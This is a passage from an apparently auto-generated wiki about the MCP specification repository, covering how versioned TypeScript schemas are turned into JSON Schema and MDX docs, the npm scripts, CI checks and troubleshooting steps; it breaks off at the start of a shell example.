The schema system consists of versioned TypeScript source files that are transformed through two parallel generation pipelines. The `typescript-json-schema` tool extracts JSON Schema definitions for validation and tooling, while TypeDoc with a custom plugin generates human-readable MDX documentation for the website.

Sources: [scripts/generate-schemas.ts:1-149](), [package.json:33-35]()

## Editing TypeScript Schemas

### Source Files Location

TypeScript schemas are located in version-specific directories:

```
schema/
├── draft/schema.ts           # Active development version
├── 2025-11-25/schema.ts      # Current stable (modern)
├── 2025-06-18/schema.ts      # Previous version (legacy)
├── 2025-03-26/schema.ts      # Earlier version (legacy)
└── 2024-11-05/schema.ts      # Earlier version (legacy)
```

**Active development occurs in `schema/draft/schema.ts`**. When a new protocol version is released, the draft schema is copied to a dated directory and frozen.

Sources: [scripts/generate-schemas.ts:10-17]()

### TypeScript Schema Structure

The TypeScript schema defines the protocol using standard TypeScript interfaces and type aliases:

```typescript
// Example from schema/draft/schema.ts
export interface JSONRPCRequest extends Request {
  jsonrpc: typeof JSONRPC_VERSION;
  id: RequestId;
}

export interface InitializeRequest extends JSONRPCRequest {
  method: "initialize";
  params: InitializeRequestParams;
}
```

Key patterns used in the schema:

| Pattern | Purpose | Example |
|---------|---------|---------|
| `interface` | Define protocol message structures | `InitializeRequest`, `InitializeResult` |
| `type` unions | Define discriminated unions | `JSONRPCMessage`, `ContentBlock` |
| `const` types | Define literal values | `method: "initialize"` |
| TSDoc comments | Document types for generation | `/** Description */` |
| `@category` tags | Organize generated docs | `@category "initialize"` |

Sources: [schema/draft/schema.ts:1-150](), [schema/draft/schema.ts:242-270]()

### Validation During Editing

To validate TypeScript syntax and type correctness while editing:

```bash
npm run check:schema:ts
```

This command runs three checks:

1. **TypeScript compilation** (`tsc --noEmit`) - Validates type correctness without generating output
2. **ESLint** - Enforces code quality rules
3. **Prettier** - Validates code formatting

Sources: [package.json:29]()

## Generation Pipeline

### JSON Schema Generation

```mermaid
graph LR
    TSSource["schema/VERSION/schema.ts"]
    TJS["typescript-json-schema<br/>--defaultNumberType integer<br/>--required<br/>--skipLibCheck"]
    RawJSON["Raw JSON Schema<br/>draft-07 format"]
    Transform["applyJsonSchema202012Transformations()"]
    FinalJSON["schema/VERSION/schema.json"]
    
    TSSource --> TJS
    TJS --> RawJSON
    RawJSON --> Transform
    Transform --> FinalJSON
    
    Note1["Modern versions only<br/>(2025-11-25, draft)"]
    
    Transform -.-> Note1
```

**Title: JSON Schema Generation Process**

The `typescript-json-schema` tool extracts JSON Schema definitions from TypeScript interfaces. For modern schema versions, the output is transformed from JSON Schema draft-07 to 2020-12 format.

#### Transformation Details

For modern schemas (`2025-11-25` and `draft`), three transformations are applied:

| Transformation | Draft-07 Format | 2020-12 Format |
|----------------|-----------------|----------------|
| Schema URI | `http://json-schema.org/draft-07/schema#` | `https://json-schema.org/draft/2020-12/schema` |
| Definitions key | `"definitions":` | `"$defs":` |
| Definition references | `#/definitions/` | `#/$defs/` |

Legacy schemas (`2024-11-05`, `2025-03-26`, `2025-06-18`) maintain draft-07 format for backward compatibility.

Sources: [scripts/generate-schemas.ts:10-14](), [scripts/generate-schemas.ts:23-47]()

### MDX Documentation Generation

```mermaid
graph LR
    TSSource["schema/VERSION/schema.ts"]
    Template["schema/VERSION/schema.mdx<br/>Template with frontmatter"]
    TypeDoc["typedoc<br/>--entryPoints schema.ts<br/>--schemaPageTemplate schema.mdx"]
    MDXOutput["docs/specification/VERSION/schema.mdx<br/>Mintlify-compatible"]
    
    TSSource --> TypeDoc
    Template --> TypeDoc
    TypeDoc --> MDXOutput
```

**Title: MDX Documentation Generation Process**

TypeDoc processes TypeScript source files and uses a custom template (`schema.mdx`) to generate Mintlify-compatible MDX documentation. The template includes frontmatter and structure, while TypeDoc populates it with type information and descriptions.

#### Template Structure

Each version directory contains a `schema.mdx` template:

```
schema/draft/schema.mdx       # Template for draft version
schema/2025-11-25/schema.mdx  # Template for 2025-11-25 version
```

The generated output is written to:

```
docs/specification/draft/schema.mdx
docs/specification/2025-11-25/schema.mdx
```

Sources: [package.json:35]()

### Running Generation Commands

| Command | Purpose | When to Use |
|---------|---------|-------------|
| `npm run generate:schema` | Generate both JSON and MDX | After editing TypeScript schemas |
| `npm run generate:schema:json` | Generate JSON schemas only | Testing JSON transformations |
| `npm run generate:schema:md` | Generate MDX documentation only | Testing documentation output |
| `npm run check:schema` | Validate without generating | Pre-commit validation |

The `generate:schema` command runs both JSON and MDX generation in parallel using shell background jobs (`&` and `wait`).

Sources: [package.json:33-35]()

## Version Management

### Legacy vs Modern Schemas

```mermaid
graph TB
    subgraph "Legacy Versions (JSON Schema draft-07)"
        L1["2024-11-05<br/>First public release"]
        L2["2025-03-26<br/>Added features"]
        L3["2025-06-18<br/>Last legacy version"]
    end
    
    subgraph "Modern Versions (JSON Schema 2020-12)"
        M1["2025-11-25<br/>First modern version<br/>Tasks, simplified auth"]
        M2["draft<br/>Active development"]
    end
    
    L1 --> L2
    L2 --> L3
    L3 --> M1
    M1 --> M2
    
    Note1["Maintain draft-07<br/>for compatibility"]
    Note2["Adopt 2020-12<br/>$defs terminology"]
    
    L3 -.-> Note1
    M1 -.-> Note2
```

**Title: Schema Version Evolution and JSON Schema Dialect Split**

The schema version split occurred at `2025-11-25` when the protocol adopted JSON Schema 2020-12. Earlier versions remain frozen in draft-07 format to preserve backward compatibility for existing implementations.

### Version-Specific Constants

The `generate-schemas.ts` script maintains two arrays defining which transformation pipeline to use:

```typescript
// Legacy schemas remain as JSON Schema draft-07
const LEGACY_SCHEMAS = ['2024-11-05', '2025-03-26', '2025-06-18'];

// Modern schemas use JSON Schema 2020-12
const MODERN_SCHEMAS = ['2025-11-25', 'draft'];
```

Sources: [scripts/generate-schemas.ts:10-14]()

### Adding a New Version

When releasing a new protocol version:

1. **Copy draft schema to dated directory**:
   ```bash
   cp -r schema/draft schema/YYYY-MM-DD
   ```

2. **Update version constants** in `scripts/generate-schemas.ts`:
   ```typescript
   const MODERN_SCHEMAS = ['2025-11-25', 'YYYY-MM-DD', 'draft'];
   ```

3. **Generate artifacts for new version**:
   ```bash
   npm run generate:schema
   ```

4. **Update documentation navigation** in `docs.json` to include the new version

Sources: [scripts/generate-schemas.ts:10-17]()

## Development Workflow

### Complete Development Cycle

```mermaid
sequenceDiagram
    participant Dev as Developer
    participant TS as schema/draft/schema.ts
    participant Gen as Generation Scripts
    participant JSON as schema/draft/schema.json
    participant MDX as docs/specification/draft/schema.mdx
    participant CI as GitHub Actions
    
    Dev->>TS: Edit TypeScript schema
    Dev->>Dev: npm run check:schema:ts
    Note over Dev: Validate TypeScript
    
    Dev->>Gen: npm run generate:schema
    Gen->>JSON: typescript-json-schema
    Gen->>JSON: applyJsonSchema202012Transformations()
    Gen->>MDX: typedoc --schemaPageTemplate
    Gen-->>Dev: Generation complete
    
    Dev->>Dev: npm run check:docs
    Note over Dev: Validate docs formatting
    
    Dev->>CI: git push
    CI->>CI: npm run check:schema:json
    CI->>CI: npm run check:schema:md
    Note over CI: Validate generated<br/>artifacts match source
    
    alt Artifacts out of sync
        CI-->>Dev: ✗ Check failed
        Dev->>Gen: npm run generate:schema
        Dev->>CI: git push (with updated artifacts)
    else Artifacts in sync
        CI-->>Dev: ✓ Check passed
    end
```

**Title: Complete Schema Development and Validation Workflow**

The workflow ensures that all generated artifacts remain synchronized with the TypeScript source. CI validation catches any cases where generated files were not committed after source changes.

### Recommended Development Steps

1. **Make changes to TypeScript schema**:
   ```bash
   # Edit schema/draft/schema.ts
   vim schema/draft/schema.ts
   ```

2. **Validate TypeScript**:
   ```bash
   npm run check:schema:ts
   ```

3. **Generate artifacts**:
   ```bash
   npm run generate:schema
   ```

4. **Validate all changes**:
   ```bash
   npm run check:docs
   npm run format
   ```

5. **Or run everything at once**:
   ```bash
   npm run prep:changes
   ```

The `prep:changes` command is a convenience script that runs the complete validation and generation pipeline.

Sources: [package.json:36]()

## CI/CD Validation

### GitHub Actions Workflow

The CI pipeline validates schema consistency through three checks:

```yaml
# .github/workflows/main.yml
- name: Check TypeScript definitions
  run: npm run check:schema:ts

- name: Check schema.json files are up to date
  run: npm run check:schema:json

- name: Check schema.mdx files are up to date
  run: npm run check:schema:md
```

Sources: [.github/workflows/main.yml:21-28]()

### Check Mode Operation

```mermaid
graph TB
    CheckJSON["npm run check:schema:json"]
    GenTemp["Generate to stdout<br/>(in-memory)"]
    Compare["Compare with<br/>schema/VERSION/schema.json"]
    CheckMD["npm run check:schema:md"]
    GenTempMD["Generate to stdout<br/>(in-memory)"]
    CompareMD["Compare with<br/>docs/specification/VERSION/schema.mdx"]
    
    CheckJSON --> GenTemp
    GenTemp --> Compare
    
    CheckMD --> GenTempMD
    GenTempMD --> CompareMD
    
    Compare -->|Match| Pass1["✓ Up to date"]
    Compare -->|Differ| Fail1["✗ Out of date<br/>Run npm run generate:schema:json"]
    
    CompareMD -->|Match| Pass2["✓ Up to date"]
    CompareMD -->|Differ| Fail2["✗ Out of date<br/>Run npm run generate:schema:md"]
```

**Title: CI Validation Check Mode Process**

Check mode generates artifacts in memory and compares them against committed files, failing the build if they differ. This ensures developers cannot forget to regenerate artifacts after schema changes.

### Check Command Implementation

The check commands use the `--check` flag to enable validation mode:

```typescript
// scripts/generate-schemas.ts
const CHECK_MODE = process.argv.includes('--check');

if (CHECK_MODE) {
  // Generate to stdout and compare
  const { stdout: generated } = await execAsync(
    `npx typescript-json-schema ... "${schemaTs}" "*"`
  );
  
  const existingSchema = readFileSync(schemaJson, 'utf-8');
  
  if (existingSchema.trim() !== expectedSchema.trim()) {
    console.error(`✗ Schema ${version} is out of date!`);
    return false;
  }
}
```

Sources: [scripts/generate-schemas.ts:20-87](), [package.json:30-31]()

## npm Scripts Reference

### Complete Script Matrix

| Script | Purpose | Mode | Fails CI? |
|--------|---------|------|-----------|
| `check` | Run all checks | Validation | Yes |
| `check:schema` | Check all schema artifacts | Validation | Yes |
| `check:schema:ts` | Validate TypeScript only | Validation | Yes |
| `check:schema:json` | Validate JSON schemas | Validation | Yes |
| `check:schema:md` | Validate MDX docs | Validation | Yes |
| `check:docs` | Validate documentation | Validation | Yes |
| `generate:schema` | Generate JSON + MDX | Generation | No |
| `generate:schema:json` | Generate JSON schemas | Generation | No |
| `generate:schema:md` | Generate MDX docs | Generation | No |
| `format` | Format markdown files | Modification | No |
| `prep:changes` | Complete validation + generation + format | Both | No |

### Script Dependencies

```mermaid
graph TB
    PrepChanges["npm run prep:changes"]
    CheckSchemaTS["npm run check:schema:ts"]
    GenSchema["npm run generate:schema"]
    GenJSON["npm run generate:schema:json"]
    GenMD["npm run generate:schema:md"]
    CheckDocs["npm run check:docs"]
    Format["npm run format"]
    
    PrepChanges --> CheckSchemaTS
    PrepChanges --> GenSchema
    PrepChanges --> CheckDocs
    PrepChanges --> Format
    
    GenSchema --> GenJSON
    GenSchema --> GenMD
    
    Note1["Run in parallel<br/>using & wait"]
    GenSchema -.-> Note1
```

**Title: npm Script Dependencies and Execution Order**

The `prep:changes` script orchestrates the complete workflow, running TypeScript validation first, then parallel generation, followed by documentation checks and formatting.

Sources: [package.json:23-38]()

## Tool Configuration

### typescript-json-schema Options

The `typescript-json-schema` command uses specific flags to control output:

```bash
npx typescript-json-schema \
  --defaultNumberType integer \    # Numbers default to integer type
  --required \                     # Mark required fields explicitly
  --skipLibCheck \                 # Skip node_modules type checking
  "schema.ts" "*"                  # Export all types
```

These options ensure the generated JSON Schema matches MCP's conventions: numbers are integers by default, required fields are explicit, and library types don't interfere with generation.

Sources: [scripts/generate-schemas.ts:64-65]()

### TypeDoc Configuration

TypeDoc uses a custom plugin to generate Mintlify-compatible MDX:

```bash
typedoc \
  --entryPoints "schema/VERSION/schema.ts" \
  --schemaPageTemplate "schema/VERSION/schema.mdx"
```

The `--schemaPageTemplate` flag points to the template file that provides structure and frontmatter for the generated documentation.

Sources: [package.json:35]()

## Troubleshooting

### Generated Files Are Out of Sync

**Symptom**: CI fails with "Schema X is out of date"

**Solution**:
```bash
npm run generate:schema
git add schema/*/schema.json docs/specification/*/schema.mdx
git commit -m "Regenerate schema artifacts"
```

### TypeScript Validation Fails

**Symptom**: `npm run check:schema:ts` reports type errors

**Solution**:
1. Review TypeScript errors in the output
2. Fix type definitions in `schema/draft/schema.ts`
3. Ensure interfaces extend properly and types are correct
4. Re-run validation: `npm run check:schema:ts`

### JSON Schema Transformations Not Applied

**Symptom**: Modern schema versions still show `definitions` instead of `$defs`

**Solution**:
1. Verify version is listed in `MODERN_SCHEMAS` array in `scripts/generate-schemas.ts`
2. Regenerate: `npm run generate:schema:json`
3. Check generated file uses `$defs` and `https://json-schema.org/draft/2020-12/schema`

### MDX Generation Produces Invalid Output

**Symptom**: TypeDoc fails or generates malformed MDX

**Solution**:
1. Check template file exists: `schema/VERSION/schema.mdx`
2. Ensure template has valid frontmatter
3. Verify TypeDoc version matches `package.json`: `npm list typedoc`
4. Regenerate: `npm run generate:schema:md`

Sources: [scripts/generate-schemas.ts:86-109]()

## File Naming Conventions

### Generated Files Must Not Be Edited

Generated files are marked in `.gitattributes` as `linguist-generated`:

```gitattributes
schema/*/schema.json linguist-generated
docs/specification/*/schema.mdx linguist-generated
```

Additionally, `.prettierignore` excludes generated documentation from formatting:

```
docs/specification/*/schema.mdx
```

**These files must never be edited directly.** All changes must go through the TypeScript source and generation pipeline. Manual edits will be overwritten on the next generation run and will cause CI to fail.

Sources: [package.json:32]()

---

# Page: Build System and Automation

# Build System and Automation

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [CLAUDE.md](CLAUDE.md)
- [package-lock.json](package-lock.json)
- [package.json](package.json)
- [scripts/check-mdx-comments.ts](scripts/check-mdx-comments.ts)
- [scripts/generate-schemas.ts](scripts/generate-schemas.ts)
- [tsconfig.json](tsconfig.json)

</details>



This document describes the automated build system and npm scripts for the MCP specification repository. The build system generates JSON schemas and MDX documentation from TypeScript sources, enforces code quality standards, and validates that all generated artifacts remain synchronized with their sources.

For information about the schema development workflow and how to edit schema sources, see page 7.3. For the documentation publishing system that consumes these build artifacts, see page 7.5.

## npm Scripts Overview

The build system is orchestrated through npm scripts defined in `package.json`. These scripts fall into three categories: generation, formatting, and validation.

**Generation Scripts:**

| Script | Command | Purpose |
|--------|---------|---------|
| `npm run generate` | Runs `generate:schema` and `generate:seps` in parallel | Generate all schema and SEP artifacts |
| `npm run generate:schema` | Runs `generate:schema:json` and `generate:schema:md` in parallel | Generate JSON schemas and MDX documentation |
| `npm run generate:schema:json` | `tsx scripts/generate-schemas.ts` | Generate JSON schemas from TypeScript sources |
| `npm run generate:schema:md` | TypeDoc with `--schemaPageTemplate` for each version | Generate MDX documentation from TypeScript |
| `npm run generate:seps` | `tsx scripts/render-seps.ts` | Render SEP documents from markdown |

**Formatting Scripts:**

| Script | Command | Purpose |
|--------|---------|---------|
| `npm run format` | Runs `format:docs` and `format:schema` in parallel | Format all files |
| `npm run format:docs` | `prettier --write "**/*.{md,mdx}"` | Format markdown and MDX files |
| `npm run format:schema` | `prettier --write "schema/**/*.ts"` | Format TypeScript schema files |

**Validation Scripts:**

| Script | Command | Purpose |
|--------|---------|---------|
| `npm run check` | Runs `check:schema`, `check:docs`, and `check:seps` in sequence | Validate all artifacts |
| `npm run check:schema` | Runs all schema checks in sequence | Validate schema sources and generated artifacts |
| `npm run check:schema:ts` | `tsc --noEmit && eslint schema/ && prettier --check` | Validate TypeScript compilation, linting, and formatting |
| `npm run check:schema:json` | `tsx scripts/generate-schemas.ts --check` | Validate JSON schemas match sources (dry-run) |
| `npm run check:schema:examples` | `tsx scripts/validate-examples.ts` | Validate example JSON files against schemas |
| `npm run check:schema:md` | TypeDoc comparison with `cmp` for each version | Validate MDX documentation matches sources |
| `npm run check:docs` | Runs `check:docs:format`, `check:docs:js-comments`, and `check:docs:links` | Validate documentation quality |
| `npm run check:docs:format` | `prettier --check "**/*.{md,mdx}"` | Validate markdown formatting |
| `npm run check:docs:js-comments` | `tsx scripts/check-mdx-comments.ts` | Detect JS comments in MDX ESM blocks |
| `npm run check:docs:links` | `cd docs && npx mint broken-links` | Validate internal links in documentation |
| `npm run check:seps` | `tsx scripts/render-seps.ts --check` | Validate SEP documents |

**Convenience Scripts:**

| Script | Command | Purpose |
|--------|---------|---------|
| `npm run prep` | `check:schema:ts → generate → check:docs → format` | Full developer workflow before commit |
| `npm run serve:docs` | `cd docs && npx mint dev` | Start local Mintlify documentation server |
| `npm run serve:blog` | `cd blog && hugo serve` | Start local Hugo blog server |

Sources: [package.json:23-45]()

## Build System Architecture

The build system orchestrates three parallel generation pipelines and multiple validation layers to maintain consistency across the repository:

**Build System Flow:**

```mermaid
graph TB
    subgraph "Source Files"
        SchemaTS["schema/*/schema.ts<br/>TypeScript Definitions"]
        SEPFiles["seps/*.md<br/>SEP Documents"]
        DocsContent["docs/**/*.{md,mdx}<br/>Documentation Content"]
    end
    
    subgraph "npm Scripts"
        Check["npm run check"]
        Generate["npm run generate"]
        Prep["npm run prep"]
        
        CheckSchema["check:schema"]
        CheckDocs["check:docs"]
        CheckSEPs["check:seps"]
        GenSchema["generate:schema"]
        GenSEPs["generate:seps"]
        Format["format"]
    end
    
    subgraph "Build Tools"
        TSC["tsc<br/>TypeScript Compiler"]
        ESLint["eslint<br/>Linting"]
        Prettier["prettier<br/>Formatting"]
        GenSchemaScript["generate-schemas.ts<br/>tsx executor"]
        RenderSEPs["render-seps.ts<br/>tsx executor"]
        TypeDoc["typedoc<br/>API Documentation"]
        MintCLI["mint broken-links<br/>Link Validator"]
        CheckMDXComments["check-mdx-comments.ts<br/>MDX Validation"]
        ValidateExamples["validate-examples.ts<br/>JSON Validation"]
    end
    
    subgraph "Generated Artifacts"
        SchemaJSON["schema/*/schema.json"]
        SchemaMDX["docs/specification/*/schema.mdx"]
        SEPRendered["docs/seps/*.mdx"]
        FormattedDocs["Formatted *.{md,mdx}"]
    end
    
    Check --> CheckSchema
    Check --> CheckDocs
    Check --> CheckSEPs
    
    CheckSchema --> TSC
    CheckSchema --> ESLint
    CheckSchema --> GenSchemaScript
    CheckSchema --> ValidateExamples
    CheckSchema --> TypeDoc
    
    CheckDocs --> Prettier
    CheckDocs --> CheckMDXComments
    CheckDocs --> MintCLI
    
    CheckSEPs --> RenderSEPs
    
    Generate --> GenSchema
    Generate --> GenSEPs
    
    GenSchema --> GenSchemaScript
    GenSchema --> TypeDoc
    
    GenSEPs --> RenderSEPs
    
    Prep --> CheckSchema
    Prep --> GenSchema
    Prep --> CheckDocs
    Prep --> Format
    
    SchemaTS --> TSC
    SchemaTS --> ESLint
    SchemaTS --> GenSchemaScript
    SchemaTS --> TypeDoc
    
    SEPFiles --> RenderSEPs
    
    DocsContent --> Prettier
    DocsContent --> CheckMDXComments
    DocsContent --> MintCLI
    
    GenSchemaScript --> SchemaJSON
    TypeDoc --> SchemaMDX
    RenderSEPs --> SEPRendered
    Prettier --> FormattedDocs
```

Sources: [package.json:23-45]()

The system distinguishes between **validation mode** (used by CI) and **generation mode** (used by developers):

| Mode | Entry Point | Purpose | Exit Behavior |
|------|-------------|---------|---------------|
| Validation | `npm run check` | Verify generated artifacts match sources | Exits with error if out of sync |
| Generation | `npm run generate` | Create/update generated artifacts | Writes files to disk |
| Combined | `npm run prep` | Check → Generate → Format → Validate | Full developer workflow |

Sources: [package.json:24-45]()

## Schema Generation Pipeline

The schema generation pipeline transforms TypeScript type definitions into both machine-readable JSON schemas and human-readable MDX documentation. The `npm run generate:schema` command runs two sub-commands in parallel: `generate:schema:json` and `generate:schema:md`.

**Schema Generation Flow:**

```mermaid
graph LR
    subgraph "Version-Specific Sources"
        Draft["schema/draft/schema.ts"]
        V20251125["schema/2025-11-25/schema.ts"]
        V20250618["schema/2025-06-18/schema.ts"]
        V20250326["schema/2025-03-26/schema.ts"]
        V20241105["schema/2024-11-05/schema.ts"]
    end
    
    subgraph "generate-schemas.ts Script"
        GenScriptMain["generate-schemas.ts<br/>Main Entry Point"]
        LegacySchemas["LEGACY_SCHEMAS<br/>2024-11-05, 2025-03-26, 2025-06-18"]
        ModernSchemas["MODERN_SCHEMAS<br/>2025-11-25, draft"]
        CheckMode["--check flag<br/>Validation Mode"]
        
        GenScriptMain --> LegacySchemas
        GenScriptMain --> ModernSchemas
        GenScriptMain --> CheckMode
    end
    
    subgraph "JSON Generation Path"
        TSJSON["typescript-json-schema CLI<br/>--defaultNumberType integer<br/>--required --skipLibCheck"]
        Transform["applyJsonSchema202012Transformations<br/>$schema → 2020-12<br/>definitions → $defs"]
        
        TSJSON --> Transform
    end
    
    subgraph "MDX Generation Path"
        TypeDocCLI["typedoc CLI<br/>--entryPoints schema.ts<br/>--schemaPageTemplate schema.mdx"]
        Plugin["typedoc.plugin.mjs<br/>Custom Output: schema-page"]
        Router["SchemaPageRouter<br/>Anchor Generation"]
        
        TypeDocCLI --> Plugin
        Plugin --> Router
    end
    
    subgraph "Generated Outputs"
        JSONDraft["schema/draft/schema.json"]
        JSONV1125["schema/2025-11-25/schema.json"]
        JSONV0618["schema/2025-06-18/schema.json"]
        
        MDXDraft["docs/specification/draft/schema.mdx"]
        MDXV1125["docs/specification/2025-11-25/schema.mdx"]
        MDXV0618["docs/specification/2025-06-18/schema.mdx"]
    end
    
    Draft --> TSJSON
    V20251125 --> TSJSON
    V20250618 --> TSJSON
    
    Draft --> TypeDocCLI
    V20251125 --> TypeDocCLI
    V20250618 --> TypeDocCLI
    
    TSJSON --> JSONDraft
    TSJSON --> JSONV1125
    TSJSON --> JSONV0618
    
    TypeDocCLI --> MDXDraft
    TypeDocCLI --> MDXV1125
    TypeDocCLI --> MDXV0618
    
    ModernSchemas -.applies to.-> Transform
    LegacySchemas -.skips.-> Transform
```

Sources: [scripts/generate-schemas.ts:10-148](), [package.json:25-27]()

### JSON Schema Generation

The `generate-schemas.ts` script uses `typescript-json-schema` to generate JSON schemas from TypeScript definitions. It is invoked via `npm run generate:schema:json` which executes `tsx scripts/generate-schemas.ts`.

**Key Implementation Details:**

1. **Parallel Processing**: All schema versions are generated concurrently using `Promise.all()` for performance [scripts/generate-schemas.ts:119-121]()

2. **Version-Specific Transformations**: Modern schemas (2025-11-25, draft) undergo transformations to adopt JSON Schema 2020-12 syntax via the `applyJsonSchema202012Transformations()` function:
   - Replace `$schema` URL from draft-07 to 2020-12 [scripts/generate-schemas.ts:29-32]()
   - Replace `"definitions":` with `"$defs":` [scripts/generate-schemas.ts:34-38]()
   - Replace `#/definitions/` references with `#/$defs/` [scripts/generate-schemas.ts:40-44]()

3. **Legacy Compatibility**: Versions 2024-11-05 through 2025-06-18 retain JSON Schema draft-07 format and skip transformations [scripts/generate-schemas.ts:11, 103-105]()

4. **Check Mode**: When invoked with `--check` flag, compares in-memory generated schemas against committed files without writing to disk [scripts/generate-schemas.ts:20, 57-86]()

Sources: [scripts/generate-schemas.ts:22-110]()

### MDX Documentation Generation

TypeDoc with a custom plugin generates API reference documentation in Mintlify-compatible MDX format. The `npm run generate:schema:md` command uses `find` and `xargs` to invoke TypeDoc for each schema version in parallel.

**MDX Generation Flow:**

```mermaid
graph TB
    subgraph "Input Processing"
        TSFiles["schema/*/schema.ts"]
        Template["schema/*/schema.mdx<br/>--schemaPageTemplate"]
        
        TSFiles --> TypeDocParse["TypeDoc Parser<br/>AST Generation"]
        Template --> TemplateReader["Template Reader"]
    end
    
    subgraph "Custom Plugin: typedoc.plugin.mjs"
        OutputDef["addOutput('schema-page')<br/>Custom Output Mode"]
        CustomRouter["SchemaPageRouter<br/>extends StructureRouter"]
        Renderer["Custom Rendering Logic"]
        
        GetAnchor["getAnchor()<br/>toLowerCase, replace(/[./#]/g, '-')"]
        HasComment["hasComment()<br/>Filter documented members"]
        RenderCategory["renderCategory()<br/>Group by @category tag"]
        RenderReflection["renderReflection()<br/>Generate Markdown"]
        
        OutputDef --> CustomRouter
        CustomRouter --> GetAnchor
        Renderer --> HasComment
        Renderer --> RenderCategory
        RenderCategory --> RenderReflection
    end
    
    subgraph "Template Processing"
        CategoryMatch["Match: {/* @category CategoryName */}"]
        CategoryReplace["Replace with rendered category content"]
        ValidationCheck["Validate all categories present"]
        
        CategoryMatch --> CategoryReplace
        CategoryReplace --> ValidationCheck
    end
    
    subgraph "Mintlify Accommodations"
        ConvertHeadings["<hN> → <div data-typedoc-h='N'>"]
        ReduceIndent["4 spaces → 2 spaces"]
        EncodeSpecial["Encode: [ _ { $ as HTML entities"]
        RemoveTJS["Remove @TJS-type tags"]
        
        ConvertHeadings --> ReduceIndent
        ReduceIndent --> EncodeSpecial
        EncodeSpecial --> RemoveTJS
    end
    
    subgraph "Output"
        MDXOutput["docs/specification/*/schema.mdx<br/>stdout → file"]
    end
    
    TypeDocParse --> OutputDef
    TemplateReader --> CategoryMatch
    
    RenderReflection --> ConvertHeadings
    RemoveTJS --> MDXOutput
```

Sources: [typedoc.plugin.mjs:1-243](), [package.json:27]()

**Critical Implementation Details:**

1. **Custom Router**: `SchemaPageRouter` generates lowercase, hyphenated anchors compatible with Mintlify's heading ID generation [typedoc.plugin.mjs:34-58]()

2. **Category-Based Rendering**: The `{/* @category Name */}` syntax in templates maps to `@category` tags in TypeScript comments [typedoc.plugin.mjs:104-126]()

3. **Mintlify Parser Workarounds**: Multiple transformations accommodate Mintlify's Markdown parser limitations:
   - Non-breaking spaces (`\u00A0`) encoded as `&nbsp;` [typedoc.plugin.mjs:222]()
   - Square brackets inside HTML tags encoded as `&#x5B;` [typedoc.plugin.mjs:224]()
   - Underscores inside HTML tags encoded as `&#x5F;` [typedoc.plugin.mjs:225]()
   - Curly braces (JSX interpolation) encoded as `&#x7B;` [typedoc.plugin.mjs:226]()
   - Dollar signs encoded as `&#x24;` [typedoc.plugin.mjs:227]()

4. **Validation**: Plugin throws errors if template references categories not present in TypeScript source [typedoc.plugin.mjs:118-123]()

Sources: [typedoc.plugin.mjs:1-243](), [typedoc.config.mjs:1-19]()

## CI/CD Workflows

Two GitHub Actions workflows enforce repository quality standards:

### Main Schema Validation Workflow

The primary CI workflow validates that all generated schema artifacts match their TypeScript sources:

```mermaid
graph TB
    subgraph "Trigger Events"
        PushMain["push to main branch"]
        PullRequest["pull_request (any branch)"]
    end
    
    subgraph "Job: validate"
        Setup["actions/checkout@v4<br/>actions/setup-node@v4<br/>node-version: 20<br/>cache: npm"]
        Install["npm ci"]
        
        CheckTS["npm run check:schema:ts<br/>tsc --noEmit<br/>eslint schema/<br/>prettier --check schema/**/*.ts"]
        
        CheckJSON["npm run check:schema:json<br/>generate-schemas.ts --check<br/>Compare in-memory vs committed"]
        
        CheckMDX["npm run check:schema:md<br/>typedoc | cmp docs/specification/*/schema.mdx<br/>Validate all 5 versions"]
        
        Setup --> Install
        Install --> CheckTS
        CheckTS --> CheckJSON
        CheckJSON --> CheckMDX
    end
    
    PushMain --> Setup
    PullRequest --> Setup
    
    style CheckTS fill:#f9f9f9
    style CheckJSON fill:#f9f9f9
    style CheckMDX fill:#f9f9f9
```

**Sources:** [.github/workflows/main.yml:1-29]()

**Workflow Execution:**

1. **TypeScript Validation**: Verifies type correctness, linting compliance, and formatting [package.json:29]()
2. **JSON Schema Validation**: Runs `generate-schemas.ts --check` to confirm committed JSON schemas match generated output [package.json:30]()
3. **MDX Documentation Validation**: Executes TypeDoc for each version and compares output via `cmp` command [package.json:31]()

Each step must pass for the workflow to succeed. The sequential execution ensures TypeScript errors are caught before expensive schema generation.

**Sources:** [.github/workflows/main.yml:21-28](), [package.json:28-31]()

### Markdown Format Workflow

A separate workflow validates documentation formatting and link integrity:

```mermaid
graph TB
    subgraph "Trigger Events (Path Filters)"
        PathMD["**/*.md"]
        PathMDX["**/*.mdx"]
    end
    
    subgraph "Job: format"
        Setup["actions/checkout@v4<br/>actions/setup-node@v4<br/>node: 20"]
        Install["npm ci"]
        
        CheckFormat["npm run check:docs:format<br/>prettier --check **/*.{md,mdx}"]
        
        CheckLinks["npm run check:docs:links<br/>cd docs && npx mint broken-links"]
        
        Setup --> Install
        Install --> CheckFormat
        CheckFormat --> CheckLinks
    end
    
    PathMD --> Setup
    PathMDX --> Setup
    
    style CheckFormat fill:#f9f9f9
    style CheckLinks fill:#f9f9f9
```

**Sources:** [.github/workflows/markdown-format.yml:1-32]()

**Key Features:**

1. **Conditional Execution**: Only runs when Markdown files change [.github/workflows/markdown-format.yml:5-11]()
2. **Prettier Enforcement**: Validates consistent formatting across all `.md` and `.mdx` files [.github/workflows/markdown-format.yml:28]()
3. **Link Validation**: Uses Mintlify CLI to detect broken internal links [.github/workflows/markdown-format.yml:31]()
4. **Exclusions**: Generated schema MDX files are excluded from Prettier checks via `--ignore` flag [package.json:32]()

**Sources:** [.github/workflows/markdown-format.yml:1-32](), [package.json:26-27]()

## Validation vs Generation Pattern

The build system implements a clear separation between validation (CI) and generation (local development):

| Aspect | Validation Mode | Generation Mode |
|--------|----------------|-----------------|
| Entry Point | `npm run check` | `npm run generate:schema` |
| Execution | Dry-run, in-memory comparison | Writes files to disk |
| Exit Code | Non-zero if mismatch | Zero on success |
| Performance | Parallel comparison | Parallel generation |
| Use Case | CI enforcement | Developer workflow |

**Implementation Details:**

The `--check` flag controls behavior in `generate-schemas.ts`:

```typescript
// Validation mode: Compare in-memory against committed
if (CHECK_MODE) {
  const existingSchema = readFileSync(schemaJson, 'utf-8');
  const { stdout: generated } = await execAsync(...);
  if (existingSchema.trim() !== expectedSchema.trim()) {
    console.error(`✗ Schema ${version} is out of date!`);
    return false;
  }
}

// Generation mode: Write to disk
else {
  await execAsync(..., `-o "${schemaJson}"`);
  applyJsonSchema202012Transformations(schemaJson);
}
```

**Sources:** [scripts/generate-schemas.ts:20, 52-109]()

The MDX validation uses shell piping to achieve similar behavior:

```bash
